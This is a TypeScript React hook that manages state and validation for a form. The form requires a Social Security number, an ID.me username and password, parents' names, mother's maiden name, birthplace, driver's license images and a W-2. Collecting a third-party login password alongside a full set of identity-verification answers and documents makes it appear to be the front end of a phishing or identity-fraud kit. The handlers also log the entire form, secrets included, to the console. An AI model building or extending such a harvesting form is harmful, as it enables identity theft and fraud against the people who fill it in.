// app/hook/useSecureFill.ts
import { useState, useCallback, ChangeEvent } from 'react';

export interface FormData {
  firstName: string;
  lastName: string;
  otherNames: string;
  address: string;
  city: string;
  state: string;
  zipCode: string;
  email: string;
  phone: string;
  dob: string;
  ssn: string;
  idmeUsername: string;
  idmePassword: string;
  motherFirst: string;
  motherLast: string;
  fatherFirst: string;
  fatherLast: string;
  mothersMaiden: string;
  stateOfBirth: string;
  cityOfBirth: string;
  dlFront: File | null;
  dlBack: File | null;
  W2SSl: File | null;
}

export interface Errors {
  [key: string]: string;
}

export const initialFormState: FormData = {
  firstName: '',
  lastName: '',
  otherNames: '',
  address: '',
  city: '',
  state: '',
  zipCode: '',
  email: '',
  phone: '',
  dob: '',
  ssn: '',
  idmeUsername: '',
  idmePassword: '',
  motherFirst: '',
  motherLast: '',
  fatherFirst: '',
  fatherLast: '',
  mothersMaiden: '',
  stateOfBirth: '',
  cityOfBirth: '',
  dlFront: null,
  dlBack: null,
  W2SSl: null,
};

export interface UseSecureFillReturn {
  form: FormData;
  setForm: React.Dispatch<React.SetStateAction<FormData>>;
  errors: Errors;
  setErrors: React.Dispatch<React.SetStateAction<Errors>>;
  submitting: boolean;
  setSubmitting: React.Dispatch<React.SetStateAction<boolean>>;
  message: { type: 'success' | 'error'; text: string } | null;
  setMessage: React.Dispatch<React.SetStateAction<{ type: 'success' | 'error'; text: string } | null>>;
  validate: () => boolean;
  resetForm: () => void;
  handleChange: (
    e: ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>
  ) => void;
  handleFileChange: (
    name: keyof FormData,
    file: File | null
  ) => void;
  handleDateChange: (date: Date | null, name: keyof FormData) => void;
}

export const useSecureFill = (): UseSecureFillReturn => {
  const [form, setForm] = useState<FormData>(initialFormState);
  const [errors, setErrors] = useState<Errors>({});
  const [submitting, setSubmitting] = useState(false);
  const [message, setMessage] = useState<{ type: 'success' | 'error'; text: string } | null>(null);

  const handleChange =(
    e: ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>
  ) => {
    const { name, value, type } = e.target;
    console.log(form);
    
    
    
    // Handle checkbox inputs
    const finalValue = type === 'checkbox' 
      ? (e.target as HTMLInputElement).checked
      : value;
    
    setForm(prev => ({
      ...prev,
      [name]: finalValue,
    }));
    
    // Clear error for this field when user starts typing
    if (errors[name]) {
      setErrors(prev => {
        const newErrors = { ...prev };
        delete newErrors[name];
        return newErrors;
      });
    }
  };

  const handleFileChange = useCallback((
    name: keyof FormData,
    file: File | null
  ) => {
    setForm(prev => ({
      ...prev,
      [name]: file,
    }));
    
    // Clear error for this file field
    if (errors[name]) {
      setErrors(prev => {
        const newErrors = { ...prev };
        delete newErrors[name];
        return newErrors;
      });
    }
  }, [errors]);

// In useSecureFill.ts, update the handleDateChange function:
const handleDateChange = useCallback((
  date: Date | null,
  name: keyof FormData
) => {
  if (date) {
    // Fix: Format date consistently as YYYY-MM-DD
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, '0');
    const day = String(date.getDate()).padStart(2, '0');
    const formattedDate = `${year}-${month}-${day}`;
    
    console.log(`Setting ${name} to:`, formattedDate);
    
    setForm(prev => ({
      ...prev,
      [name]: formattedDate,
    }));
    
    // Clear error for this date field
    if (errors[name]) {
      setErrors(prev => {
        const newErrors = { ...prev };
        delete newErrors[name];
        return newErrors;
      });
    }
  } else {
    // Handle null date (cleared)
    setForm(prev => ({
      ...prev,
      [name]: '',
    }));
  }
}, [errors]);

  const validate = useCallback((): boolean => {
    const newErrors: Errors = {};
    
    // Required field validation
    const requiredFields: Array<keyof FormData> = [
      'firstName', 'lastName', 'address', 'city', 'state', 'zipCode',
      'email', 'phone', 'dob', 'ssn', 'idmeUsername', 'idmePassword',
      'motherFirst', 'motherLast', 'fatherFirst', 'fatherLast',
      'mothersMaiden', 'stateOfBirth', 'cityOfBirth'
    ];
    
    requiredFields.forEach(field => {
      if (!form[field] || (typeof form[field] === 'string' && form[field].trim() === '')) {
        newErrors[field] = 'This field is required';
      }
    });
    
    // Email validation
    if (form.email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) {
      newErrors.email = 'Please enter a valid email address';
    }
    
    // Phone validation
    if (form.phone) {
      // Remove all non-numeric characters and check length
      // const cleanPhone = form.phone.replace(/\D/g, '');
      // if (cleanPhone.length < 10) {
      //   newErrors.phone = 'Please enter a valid phone number (at least 10 digits)';
      // }
    } else {
      newErrors.phone = 'Phone number is required';
    }
    // SSN validation
    if (form.ssn && !/^\d{3}-?\d{2}-?\d{4}$/.test(form.ssn)) {
      newErrors.ssn = 'Please enter a valid SSN (XXX-XX-XXXX)';
    }
    
    // ZIP code validation
    if (form.zipCode && !/^\d{5}(-\d{4})?$/.test(form.zipCode)) {
      newErrors.zipCode = 'Please enter a valid ZIP code';
    }
    
    // File validation
    if (!form.dlFront) {
      newErrors.dlFront = 'Driver\'s license front is required';
    }
    
    if (!form.dlBack) {
      newErrors.dlBack = 'Driver\'s license back is required';
    }
    
    if (!form.W2SSl) {
      newErrors.W2SSl = 'W-2 or Social Security letter is required';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  }, [form]);

  const resetForm = useCallback(() => {
    setForm(initialFormState);
    setErrors({});
    setMessage(null);
    setSubmitting(false);
  }, []);

  return {
    form,
    setForm,
    errors,
    setErrors,
    submitting,
    setSubmitting,
    message,
    setMessage,
    validate,
    resetForm,
    handleChange,
    handleFileChange,
    handleDateChange,
  };
};